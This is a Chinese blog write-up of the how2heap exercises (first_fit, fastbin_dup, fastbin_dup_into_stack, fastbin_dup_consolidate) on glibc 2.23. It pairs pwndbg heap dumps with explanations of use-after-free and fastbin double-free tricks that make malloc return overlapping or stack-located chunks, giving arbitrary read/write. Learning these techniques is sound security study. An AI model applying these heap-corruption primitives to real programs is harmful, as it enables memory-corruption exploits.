---
title: how2heap - 1
date: 2019-07-08 17:01:37
tags: pwn
---

# how2heap - 1

[how2heap](https://github.com/shellphish/how2heap)

<!--more-->

我本地的 glibc 环境是 2.23 (Ubuntu 16.04 LTS)

查看 ASLR:

``` bash
cat /proc/sys/kernel/randomize_va_space
# case 0:
#   关闭ASLR
# case 1:
#   mmap base、stack、vdso page将随机化。这意味着.so文件将被加载到随机地址。链接时指定了-pie选项的可执行程序，其代码段加载地址将被随机化。配置内核时如果指定了CONFIG_COMPAT_BRK，randomize_va_space缺省为1。此时heap没有随机化。
# case 2:
#    在1的基础上增加了heap随机化。配置内核时如果禁用CONFIG_COMPAT_BRK，randomize_va_space缺省为2。
```

关闭 ASLR
``` bash
sysctl -w kernel.randomize_va_space=0
```

开始做的时候没关随机化，所以地址看起来会比较奇怪。

## first_fit

```
This file doesn't demonstrate an attack, but shows the nature of glibc's allocator.
glibc uses a first-fit algorithm to select a free chunk.
If a chunk is free and large enough, malloc will select this chunk.
This can be exploited in a use-after-free situation.
Allocating 2 buffers. They can be large, don't have to be fastbin.
1st malloc(512): 0x55b640246010
2nd malloc(256): 0x55b640246220
we could continue mallocing here...
now let's put a string at a that we can read later "this is A!"
first allocation 0x55b640246010 points to this is A!
Freeing the first one...
We don't need to free anything again. As long as we allocate less than 512, it will end up at 0x55b640246010
So, let's allocate 500 bytes
3rd malloc(500): 0x55b640246010
And put a different string here, "this is C!"
3rd allocation 0x55b640246010 points to this is C!
first allocation 0x55b640246010 points to this is C!
```

### 顺序

```
a = malloc(512)
b = malloc(256)
strcpy(a, "this is A!")
free(a)
c = malloc(500)
strcpy(c, "this is C!")
show(c_addr)
show(a_addr)
```

### 解释

首先分配一个 512 大小的块，地址为 0x55b640246010，再分配一个大小为 256 的块，地址为 0x55b640246220。

此时堆状态如下：

```
pwndbg> heap
0x555555757000 PREV_INUSE {
  prev_size = 0, 
  size = 529, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x555555757210 PREV_INUSE {
  prev_size = 0, 
  size = 273, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x555555757320 PREV_INUSE {
  prev_size = 0, 
  size = 134369, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
```

然后向 A 中写入字符串：

```
0x555555757000 PREV_INUSE {
  prev_size = 0, 
  size = 529, 
  fd = 0x2073692073696874, 
  bk = 0x2141, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
pwndbg> x/20a 0x555555757000
0x555555757000:	0x0	0x211
0x555555757010:	0x2073692073696874	0x2141
0x555555757020:	0x0	0x0
0x555555757030:	0x0	0x0
0x555555757040:	0x0	0x0
0x555555757050:	0x0	0x0
0x555555757060:	0x0	0x0
0x555555757070:	0x0	0x0
0x555555757080:	0x0	0x0
0x555555757090:	0x0	0x0
pwndbg> x/5s 0x555555757010
0x555555757010:	"this is A!"
0x55555575701b:	""
0x55555575701c:	""
0x55555575701d:	""
0x55555575701e:	""
```

接下来释放 chunk a。由于 a 的大小为 512，不适于 fastbins，glibc 会将这个 chunk 放入 unsortedbin。

```
pwndbg> unsortedbin
unsortedbin
all: 0x555555757000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x555555757000
```

原因：

1. 当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。
2. 释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。
3. 当进行 malloc_consolidate 时，如果不是和 top chunk 近邻的话，可能会把合并后的 chunk 放到 unsorted bin 中。

More:

1. Unsorted Bin 在使用的过程中，采用的遍历顺序是 FIFO，**即插入的时候插入到 unsorted bin 的头部，取出的时候从链表尾获取**。
2. 在程序 malloc 时，如果在 fastbin，small bin 中找不到对应大小的 chunk，就会尝试从 Unsorted Bin 中寻找 chunk。如果取出来的 chunk 大小刚好满足，就会直接返回给用户，否则就会把这些 chunk 分别插入到对应的 bin 中。

再申请一个大小为 500 的块，因为这一块和我们之前 free 的那块大小差不多，系统会优先从 bins 里找到一个合适的 chunk 把他取出来再使用。

这里向 C 中写入 `"this is C"`。

```
0x555555757000 PREV_INUSE {
  prev_size = 0, 
  size = 529, 
  fd = 0x2073692073696874, 
  bk = 0x7ffff7002143, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
pwndbg> x/20a 0x555555757000
0x555555757000:	0x0	0x211
0x555555757010:	0x2073692073696874	0x7ffff7002143
0x555555757020:	0x0	0x0
0x555555757030:	0x0	0x0
0x555555757040:	0x0	0x0
0x555555757050:	0x0	0x0
0x555555757060:	0x0	0x0
0x555555757070:	0x0	0x0
0x555555757080:	0x0	0x0
0x555555757090:	0x0	0x0
pwndbg> x/5s 0x555555757010
0x555555757010:	"this is C!"
0x55555575701b:	"\367\377\177"
0x55555575701f:	""
0x555555757020:	""
0x555555757021:	""
```

unsortedbin 也被取出：

```
pwndbg> unsortedbin 
unsortedbin
all: 0x0
```

这时可以发现，C 的位置也是 A 的位置，我们打印 a 的内容也会输出 `"this is C"`。这是一个明显的 UAF(Use After Free) 漏洞。

```
pwndbg> p &a
$2 = (char **) 0x7fffffffdc68
pwndbg> x/20a 0x7fffffffdc68
0x7fffffffdc68:	0x555555757010	0x555555757220
0x7fffffffdc78:	0x555555757010	0x7fffffffdd70
0x7fffffffdc88:	0x0	0x555555554a20 <__libc_csu_init>
0x7fffffffdc98:	0x7ffff7a2d830 <__libc_start_main+240>	0x1
0x7fffffffdca8:	0x7fffffffdd78	0x1f7ffcca0
0x7fffffffdcb8:	0x55555555475a <main>	0x0
0x7fffffffdcc8:	0xf9f925f8975b0ef5	0x555555554650 <_start>
0x7fffffffdcd8:	0x7fffffffdd70	0x0
0x7fffffffdce8:	0x0	0xacac70adba5b0ef5
0x7fffffffdcf8:	0xacac6017accb0ef5	0x0
pwndbg> x/20a 0x555555757010
0x555555757010:	0x2073692073696874	0x7ffff7002143
0x555555757020:	0x0	0x0
0x555555757030:	0x0	0x0
0x555555757040:	0x0	0x0
0x555555757050:	0x0	0x0
0x555555757060:	0x0	0x0
0x555555757070:	0x0	0x0
0x555555757080:	0x0	0x0
0x555555757090:	0x0	0x0
0x5555557570a0:	0x0	0x0
pwndbg> p a
$3 = 0x555555757010 "this is C!"
```

UAF 出现的原因：指针 free 之后没有置 0。

## fastbin_dup

这道题讲了 fastbin 机制下的 double free。

### 输出：

```
This file demonstrates a simple double-free attack with fastbins.
Allocating 3 buffers.
1st malloc(8): 0x602010
2nd malloc(8): 0x602030
3rd malloc(8): 0x602050
Freeing the first one...
If we free 0x602010 again, things will crash because 0x602010 is at the top of the free list.
So, instead, we'll free 0x602030.
Now, we can free 0x602010 again, since it's not the head of the free list.
Now the free list has [ 0x602010, 0x602030, 0x602010 ]. If we malloc 3 times, we'll get 0x602010 twice!
1st malloc(8): 0x602010
2nd malloc(8): 0x602030
3rd malloc(8): 0x602010
```

### 解释

``` c
17: fprintf(stderr, "Freeing the first one...\n");
18: free(a);
19:
20: fprintf(stderr, "If we free %p again, things will crash because %p is at the top of the free list.\n", a, a);
21: // free(a);
22:
23: fprintf(stderr, "So, instead, we'll free %p.\n", b);
24: free(b);
```

如果我们首先把第 21 行的注释去掉，会报这样的错误：

```
This file demonstrates a simple double-free attack with fastbins.
Allocating 3 buffers.
1st malloc(8): 0x602010
2nd malloc(8): 0x602030
3rd malloc(8): 0x602050
Freeing the first one...
If we free 0x602010 again, things will crash because 0x602010 is at the top of the free list.
*** Error in `./fastbin_dup': double free or corruption (fasttop): 0x0000000000602010 ***
======= Backtrace: =========
/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7ffff7a847e5]
/lib/x86_64-linux-gnu/libc.so.6(+0x8037a)[0x7ffff7a8d37a]
/lib/x86_64-linux-gnu/libc.so.6(cfree+0x4c)[0x7ffff7a9153c]
./fastbin_dup[0x400762]
/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7ffff7a2d830]
./fastbin_dup[0x400579]
======= Memory map: ========
00400000-00401000 r-xp 00000000 08:01 3546821                            /home/qrz/pwn/how2heap/fastbin_dup
00600000-00601000 r--p 00000000 08:01 3546821                            /home/qrz/pwn/how2heap/fastbin_dup
00601000-00602000 rw-p 00001000 08:01 3546821                            /home/qrz/pwn/how2heap/fastbin_dup
00602000-00623000 rw-p 00000000 00:00 0                                  [heap]
7ffff0000000-7ffff0021000 rw-p 00000000 00:00 0 
7ffff0021000-7ffff4000000 ---p 00000000 00:00 0 
7ffff77f7000-7ffff780d000 r-xp 00000000 08:01 1837020                    /lib/x86_64-linux-gnu/libgcc_s.so.1
7ffff780d000-7ffff7a0c000 ---p 00016000 08:01 1837020                    /lib/x86_64-linux-gnu/libgcc_s.so.1
7ffff7a0c000-7ffff7a0d000 rw-p 00015000 08:01 1837020                    /lib/x86_64-linux-gnu/libgcc_s.so.1
7ffff7a0d000-7ffff7bcd000 r-xp 00000000 08:01 1832518                    /lib/x86_64-linux-gnu/libc-2.23.so
7ffff7bcd000-7ffff7dcd000 ---p 001c0000 08:01 1832518                    /lib/x86_64-linux-gnu/libc-2.23.so
7ffff7dcd000-7ffff7dd1000 r--p 001c0000 08:01 1832518                    /lib/x86_64-linux-gnu/libc-2.23.so
7ffff7dd1000-7ffff7dd3000 rw-p 001c4000 08:01 1832518                    /lib/x86_64-linux-gnu/libc-2.23.so
7ffff7dd3000-7ffff7dd7000 rw-p 00000000 00:00 0 
7ffff7dd7000-7ffff7dfd000 r-xp 00000000 08:01 1832172                    /lib/x86_64-linux-gnu/ld-2.23.so
7ffff7fdb000-7ffff7fde000 rw-p 00000000 00:00 0 
7ffff7ff6000-7ffff7ff7000 rw-p 00000000 00:00 0 
7ffff7ff7000-7ffff7ffa000 r--p 00000000 00:00 0                          [vvar]
7ffff7ffa000-7ffff7ffc000 r-xp 00000000 00:00 0                          [vdso]
7ffff7ffc000-7ffff7ffd000 r--p 00025000 08:01 1832172                    /lib/x86_64-linux-gnu/ld-2.23.so
7ffff7ffd000-7ffff7ffe000 rw-p 00026000 08:01 1832172                    /lib/x86_64-linux-gnu/ld-2.23.so
7ffff7ffe000-7ffff7fff000 rw-p 00000000 00:00 0 
7ffffffde000-7ffffffff000 rw-p 00000000 00:00 0                          [stack]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
[1]    55675 abort (core dumped)  ./fastbin_dup
```
这是一个典型的 double free，因为一个已经 free 掉的 chunk 是不能被 free 第二次的。接下来我们把注释加上，重新编译运行。编译方法：

``` bash
gcc -g -no-pie -o fastbin_dup.c -o fastbin_dup
```

首先 malloc 了三个 chunk

```
0x602000 FASTBIN {
  prev_size = 0, 
  size = 33, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x21
}
0x602020 FASTBIN {
  prev_size = 0, 
  size = 33, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x21
}
0x602040 FASTBIN {
  prev_size = 0, 
  size = 33, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x20fa1
}
0x602060 PREV_INUSE {
  prev_size = 0, 
  size = 135073, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
```

然后 `free(a)`, `free(b)`。这时 fastbin 形成了一个 fastbin freelist：

```
pwndbg> fastbins 
fastbins
0x20: 0x602020 —▸ 0x602000 ◂— 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
```

其中 `chunk A --> chunk B`。

接下来再次释放 a，发现这次没发生报错，且形成了如下的 free list：

```
pwndbg> fastbins 
fastbins
0x20: 0x602000 —▸ 0x602020 ◂— 0x602000
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
```

`chunk A --> chunk B <-- chunk A`

这样就可以绕过 fastbin 的 double free 检查了，原因如下：

> fastbin 可以看作一个 LIFO 的栈，使用单链表实现，通过 `fastbin->fd` 遍历 fastbins。由于 free 的过程会对 free list 做检查，我们不能连续两次 free 同一个 chunk，所以在这两次 free 之间增加了一次对其他 chunk 的 free 过程，从而绕过检查。再 malloc 三次，就在同一个地址 malloc 了两次，也就有了两个指向同一块内存区域的指针。

## fastbin_dup_into_stack

### 输出

```
$ ./glibc_2.25/fastbin_dup_into_stack 
This file extends on fastbin_dup.c by tricking malloc into
returning a pointer to a controlled location (in this case, the stack).
The address we want malloc() to return is 0x7fffffffdca8.
Allocating 3 buffers.
1st malloc(8): 0x603010
2nd malloc(8): 0x603030
3rd malloc(8): 0x603050
Freeing the first one...
If we free 0x603010 again, things will crash because 0x603010 is at the top of the free list.
So, instead, we'll free 0x603030.
Now, we can free 0x603010 again, since it's not the head of the free list.
Now the free list has [ 0x603010, 0x603030, 0x603010 ]. We'll now carry out our attack by modifying data at 0x603010.
1st malloc(8): 0x603010
2nd malloc(8): 0x603030
Now the free list has [ 0x603010 ].
Now, we have access to 0x603010 while it remains at the head of the free list.
so now we are writing a fake free size (in this case, 0x20) to the stack,
so that malloc will think there is a free chunk there and agree to
return a pointer to it.
Now, we overwrite the first 8 bytes of the data at 0x603010 to point right before the 0x20.
3rd malloc(8): 0x603010, putting the stack address on the free list
4th malloc(8): 0x7fffffffdca8
```

### 顺序

```
a = malloc(8)
b = malloc(8)
c = malloc(8)
free(a)
free(b)
free(a)
d = malloc(8)
malloc(8)
stack_var = 0x20
*d = (unsigned long long) (((char*)&stack_var) - sizeof(d))
malloc(8)
malloc(8)
```

### 解释

和上一题类似，首先申请三个 fastbin，然后通过 fastbin double free 操作形成了如下 freelist：

```
pwndbg> fastbins 
fastbins
0x20: 0x603000 —▸ 0x603020 ◂— 0x603000
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
```

接下来 malloc chunk d。

因为申请的 d 也是 fastbin，程序会从 fastbins 中取一个出来。由于 fastbins 是 LIFO 策略，chunk A 会被取出来使用。此时的堆地址的数据如下：

```
pwndbg> x/20a 0x603000
0x603000:	0x0	0x21
0x603010:	0x603020	0x0
0x603020:	0x0	0x21
0x603030:	0x603000	0x0
0x603040:	0x0	0x21
0x603050:	0x0	0x0
0x603060:	0x0	0x20fa1
0x603070:	0x0	0x0
0x603080:	0x0	0x0
0x603090:	0x0	0x0
```

假如我们此时对 d 进行操作：

``` c
*d = (unsigned long long) (((char*)&stack_var) - sizeof(d));
```

其中，`stack_var = 0x20` 的定义在函数内，也就是栈上。此时栈结构及其数据如下：

```
pwndbg> heap
0x603000 FASTBIN {
  prev_size = 0, 
  size = 33, 
  fd = 0x7fffffffdc58, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x21
}
pwndbg> x/20a 0x603000
0x603000:	0x0	0x21
0x603010:	0x7fffffffdc58	0x0
0x603020:	0x0	0x21
0x603030:	0x603000	0x0
0x603040:	0x0	0x21
0x603050:	0x0	0x0
0x603060:	0x0	0x20fa1
0x603070:	0x0	0x0
0x603080:	0x0	0x0
0x603090:	0x0	0x0
pwndbg> x/20a 0x7fffffffdc58
0x7fffffffdc58:	0x40091a <main+628>	0x20
0x7fffffffdc68:	0x603010	0x603030
0x7fffffffdc78:	0x603050	0x603010
0x7fffffffdc88:	0x627da7b743913600	0x4009a0 <__libc_csu_init>
0x7fffffffdc98:	0x7ffff7a2d830 <__libc_start_main+240>	0x1
0x7fffffffdca8:	0x7fffffffdd78	0x1f7ffcca0
0x7fffffffdcb8:	0x4006a6 <main>	0x0
0x7fffffffdcc8:	0x4083e6753a0065fe	0x4005b0 <_start>
0x7fffffffdcd8:	0x7fffffffdd70	0x0
0x7fffffffdce8:	0x0	0xbf7c190a900065fe
pwndbg> stack 10
00:0000│ rsp  0x7fffffffdc60 ◂— 0x20 /* ' ' */
01:0008│      0x7fffffffdc68 —▸ 0x603010 —▸ 0x7fffffffdc58 —▸ 0x40091a (main+628) ◂— 0x8e88348d0458d48
02:0010│      0x7fffffffdc70 —▸ 0x603030 —▸ 0x603000 ◂— 0x0
03:0018│      0x7fffffffdc78 —▸ 0x603050 ◂— 0x0
04:0020│      0x7fffffffdc80 —▸ 0x603010 —▸ 0x7fffffffdc58 —▸ 0x40091a (main+628) ◂— 0x8e88348d0458d48
05:0028│      0x7fffffffdc88 ◂— 0xb279771f7980f400
06:0030│ rbp  0x7fffffffdc90 —▸ 0x4009a0 (__libc_csu_init) ◂— 0x41ff894156415741
07:0038│      0x7fffffffdc98 —▸ 0x7ffff7a2d830 (__libc_start_main+240) ◂— mov    edi, eax
08:0040│      0x7fffffffdca0 ◂— 0x1
09:0048│      0x7fffffffdca8 —▸ 0x7fffffffdd78 —▸ 0x7fffffffe142 ◂— '/home/qrz/pwn/how2heap/glibc_2.25/fastbin_dup_into_stack'
```

给 `stack_var` 赋值为 20 的原因是由于伪造的 chunk 要设置 size，size 的位置位于 `地址-0x8` 的地方。这样我们就伪造了 chunk a 的 fd。

此时 fastbins 内部结构如下：

```
pwndbg> fastbins 
fastbins
0x20: 0x603000 —▸ 0x7fffffffdc58 —▸ 0x603010 ◂— 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
```

然后做一次 malloc，这里会将栈的地址放到 free list 上；

最后再 malloc 一次，根据上面的输出我们可以看到已经返回到栈上了。

### 小结

> 对于 fastbins，可以通过 double-free 覆盖 fastbins 的结构，来获得一个指向任意地址的指针。如果我们把这个地址指向 got 地址，如果我们可对 chunk 进行写或者读操作，我们就有了**任意地址写**和**任意地址读**。

## fastbin_dup_consolidate

这里展示了 large bin 中 malloc_consolidate 机制 fast 对 double free 的检查。

### 输出：

```
$ ./glibc_2.25/fastbin_dup_consolidate 
Allocated two fastbins: p1=0x602010 p2=0x602060
Now free p1!
Allocated large bin to trigger malloc_consolidate(): p3=0x6020b0
In malloc_consolidate(), p1 is moved to the unsorted bin.
Trigger the double free vulnerability!
We can pass the check in malloc() since p1 is not fast top.
Now p1 is in unsorted bin and fast bin. So we'will get it twice: 0x602010 0x602010
```

### 顺序：

```
p1 = malloc(0x40)
p2 = malloc(0x40)
free(p1)
p3 = malloc(0x400)
free(p1)
malloc(40)
malloc(40)
```

### 解释：

首先申请两个 fastbin p1、p2：

```
pwndbg> heap
0x602000 FASTBIN {
  prev_size = 0, 
  size = 81, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x602050 FASTBIN {
  prev_size = 0, 
  size = 81, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x6020a0 PREV_INUSE {
  prev_size = 0, 
  size = 135009, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
```

然后释放 p1，p1 被加入了 fastbins 中。

```
pwndbg> fastbins 
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x602000 ◂— 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
```

接下来 `malloc(400)`，创建了一个 large bin。

-----

large bins

chunk 的指针数组，每个元素是一条双向循环链表的头部，但同一条链表中的块大小不一定相同，按照从小到大的顺序排列，每个 bin 保存一定大小范围的块，主要保存大小为 1024 字节以上的块。

-----

```
pwndbg> fastbins 
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
pwndbg> smallbins 
smallbins
0x50: 0x602000 —▸ 0x7ffff7dd1bb8 (main_arena+152) ◂— 0x602000
```

我们会发现原本在 fastbins 中的 chunk p1 不见了，它跑到了 smallbins 里，而且 chunk p2 的 `prec_size` 和 `size` 字段都被修改了。

```
pwndbg> heap
0x602000 FASTBIN {
  prev_size = 0, 
  size = 81, 
  fd = 0x7ffff7dd1bb8 <main_arena+152>, 
  bk = 0x7ffff7dd1bb8 <main_arena+152>, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x602050 {
  prev_size = 80, 
  size = 80, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x6020a0 PREV_INUSE {
  prev_size = 0, 
  size = 1041, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x6024b0 PREV_INUSE {
  prev_size = 0, 
  size = 133969, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
```

这个时候就该读源码，查看 large 的分配：

```c
  /*
     If this is a large request, consolidate fastbins before continuing.
     While it might look excessive to kill all fastbins before
     even seeing if there is space available, this avoids
     fragmentation problems normally associated with fastbins.
     Also, in practice, programs tend to have runs of either small or
     large requests, but less often mixtures, so consolidation is not
     invoked all that often in most programs. And the programs that
     it is called frequently in otherwise tend to fragment.
   */

  else
    {
      idx = largebin_index (nb);
      if (have_fastchunks (av))
        malloc_consolidate (av);
    }
```

> 当分配 large chunk 时，首先根据 chunk 的大小获得对应的 large bin 的 index，接着判断当前分配区的 fast bins 中是否包含 chunk，如果有，调用 malloc_consolidate() 函数合并 fast bins 中的 chunk，并将这些空闲 chunk 加入 unsorted bin 中。因为这里分配的是一个 large chunk，所以 unsorted bin 中的 chunk 按照大小被放回 small bins 或 large bins 中。

这个时候我们就可以再次释放 p1。

```
pwndbg> fastbins 
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x602000 ◂— 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
pwndbg> smallbins 
smallbins
0x50 [corrupted]
FD: 0x602000 ◂— 0x0
BK: 0x602000 —▸ 0x7ffff7dd1bb8 (main_arena+152) ◂— 0x602000
```

这个时候，我们既有 fastbins 中的 p1 又有 smallbins 中的 p2。因此我们可以 malloc 两次，第一次从 fastbins 中取出，第二次从 smallbins 中取出，且这两块新 chunk 处于同一个位置。



# 参考文章

[通过 how2heap 复习堆利用 (一）](https://xz.aliyun.com/t/2582)

